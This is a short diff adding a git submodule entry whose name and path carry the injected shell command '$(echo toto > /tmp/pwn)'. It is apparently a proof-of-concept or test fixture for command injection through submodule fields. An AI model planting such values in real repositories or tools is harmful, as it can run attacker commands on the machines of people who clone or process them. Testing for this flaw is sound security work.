@@ -1,0 +1,3 @@
+[submodule "toto;$(echo toto > /tmp/pwn)"]
+	path = "toto;$(echo toto > /tmp/pwn)"
+	url = https://github.com/polymorf/HeapView.git
